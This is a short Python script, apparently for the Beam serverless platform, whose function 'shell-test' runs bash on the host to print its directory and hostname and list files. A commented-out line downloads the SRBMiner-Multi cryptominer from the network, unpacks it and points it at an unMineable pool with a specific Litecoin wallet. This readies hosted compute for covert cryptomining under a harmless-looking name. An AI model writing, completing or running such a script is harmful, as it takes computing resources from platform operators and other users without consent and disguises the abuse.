from beam import function
import subprocess

@function(name="shell-test")
def momo():
    result = subprocess.run(
        ["bash", "-lc", """
            echo "=== MULAI ==="
            pwd
            hostname
            ls -la

            # =========================
            # wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz && cd SRBMiner-Multi-2-4-8 && ./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."test$RANDOM"
            # =========================

            echo "=== SELESAI ==="
        """],
        capture_output=True,
        text=True,
        check=True,
    )

    print(result.stdout)

    if result.stderr:
        print(result.stderr)

    return {
        "status": "success",
        "output": result.stdout,
    }
